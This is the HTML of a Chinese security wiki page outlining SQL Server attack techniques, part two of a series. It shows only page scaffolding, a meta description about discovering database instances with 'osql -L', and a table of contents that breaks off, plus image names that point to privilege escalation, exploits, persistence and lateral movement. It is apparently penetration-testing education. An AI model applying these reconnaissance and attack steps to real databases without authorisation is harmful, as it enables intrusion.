<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
    <title>SQL Server数据库攻防详解下篇 | Tahir&#39;s Wiki</title>
    
    
        <meta name="keywords" content="SQL Server">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="[TOC] SQL Server攻击实战思路第二章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。 SQL Server实例发现SQL Server的实例发现-，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS监听服务、UDP广播、SPN服务等方式。 常见的几种实例发现-工具：  osql  1osql -L    sq">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL Server数据库攻防详解下篇">
<meta property="og:url" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/index.html">
<meta property="og:site_name" content="Tahir&#39;s Wiki">
<meta property="og:description" content="[TOC] SQL Server攻击实战思路第二章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。 SQL Server实例发现SQL Server的实例发现-，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS监听服务、UDP广播、SPN服务等方式。 常见的几种实例发现-工具：  osql  1osql -L    sq">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-2.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-5.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-6.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-4.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-8.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-9.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-7.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-10.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-11.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-0.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-4.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-5.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-8.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-6.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-9.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-10.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-11.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-12.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-13.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/权限提升-150.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-14.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-msf-exploit.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-shell.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-2.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-2.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-3.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-4.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-5.png">
<meta property="og:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-6.png">
<meta property="article:published_time" content="2021-07-03T01:54:41.000Z">
<meta property="article:modified_time" content="2021-07-03T02:53:29.163Z">
<meta property="article:author" content="Tahir">
<meta property="article:tag" content="SQL Server">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-1.png">
    

    
        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
    

    
        <link rel="icon" href="/favicon.ico">
    

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/libs/open-sans/styles.css">

    
<link rel="stylesheet" href="/libs/source-code-pro/styles.css">


    
<link rel="stylesheet" href="/css/style.css">

    
<script src="/libs/jquery/2.1.3/jquery.min.js"></script>

    
<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>

    
    
        
<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">

    
    
        
<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">

    
    
    
    


    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Tahir&#39;s Wiki</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/">首页</a>
                
                    <a class="main-nav-link" href="/archives">归档</a>
                
                    <a class="main-nav-link" href="/categories">分类</a>
                
                    <a class="main-nav-link" href="/tags">标签</a>
                
                    <a class="main-nav-link" href="/about">关于</a>
                
            </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something...">
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/">首页</a></td>
                
                    <td><a class="main-nav-link" href="/archives">归档</a></td>
                
                    <td><a class="main-nav-link" href="/categories">分类</a></td>
                
                    <td><a class="main-nav-link" href="/tags">标签</a></td>
                
                    <td><a class="main-nav-link" href="/about">关于</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
            
                <aside id="sidebar">
   
        
    <div class="widget-wrap" id="categories">
        <h3 class="widget-title">
            <span>categories</span>
            &nbsp;
            <a id="allExpand" href="#">
                <i class="fa fa-angle-double-down fa-2x"></i>
            </a>
        </h3>
        
        
        
         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            威胁猎捕
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Cobalt Strike
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            数据库攻防
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Oracle Database
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            SQL Server
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file active"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
    </div>
    <script>
        $(document).ready(function() {
            var iconFolderOpenClass  = 'fa-folder-open';
            var iconFolderCloseClass = 'fa-folder';
            var iconAllExpandClass = 'fa-angle-double-down';
            var iconAllPackClass = 'fa-angle-double-up';
            // Handle directory-tree expansion:
            // 左键单独展开目录
            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
                event.preventDefault();

                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var subtree = $(this).siblings('ul');
                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if (expanded) {
                    if (typeof subtree != 'undefined') {
                        subtree.slideUp({ duration: 100 });
                    }
                    icon.addClass(iconFolderCloseClass);
                } else {
                    if (typeof subtree != 'undefined') {
                        subtree.slideDown({ duration: 100 });
                    }
                    icon.addClass(iconFolderOpenClass);
                }
            });
            // 右键展开下属所有目录
            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var listNode = $(this).siblings('ul');
                var subtrees = $.merge(listNode.find('li ul'), listNode);
                var icons = $.merge(listNode.find('.fa'), icon);
                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if(expanded) {
                    subtrees.slideUp({ duration: 100 });
                    icons.addClass(iconFolderCloseClass);
                } else {
                    subtrees.slideDown({ duration: 100 });
                    icons.addClass(iconFolderOpenClass);
                }
            })
            // 展开关闭所有目录按钮
            $(document).on('click', '#allExpand', function (event) {
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconAllExpandClass);
                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
                if(expanded) {
                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
                    $('#categories li ul').slideDown({ duration: 100 });
                    icon.addClass(iconAllPackClass);
                } else {
                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
                    $('#categories li ul').slideUp({ duration: 100 });
                    icon.addClass(iconAllExpandClass);
                }
            });  
        });
    </script>

    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>
            
            <section id="main"><article id="post-数据库攻防/SQL Server/SQL-Server数据库攻防详解下篇" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        
            <header class="article-header">
                
                    <div class="article-meta">
                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/">数据库攻防</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL-Server/">SQL Server</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/SQL-Server/" rel="tag">SQL Server</a>
    </div>

                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">
            <time datetime="2021-07-03T01:54:41.000Z" itemprop="datePublished">2021-07-03</time>
        </a>
    </div>


                        
                            <i class="fa fa-bar-chart"></i>
                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
                        
                        
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/数据库攻防/SQL Server/SQL-Server数据库攻防详解下篇.md"> Source </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/数据库攻防/SQL Server/SQL-Server数据库攻防详解下篇.md"> Edit </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/数据库攻防/SQL Server/SQL-Server数据库攻防详解下篇.md"> History </a>
                            </div>
                        
                    </div>
                
                
    
        <h1 class="article-title" itemprop="name">
            SQL Server数据库攻防详解下篇
        </h1>
    

            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
        
            
                <div id="toc" class="toc-article">
                <strong class="toc-title">Catalogue</strong>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">SQL Server攻击实战思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">SQL Server实例发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">本地实例发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">远程实例发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">域内实例发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SPN%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.4.</span> <span class="toc-text">SPN服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 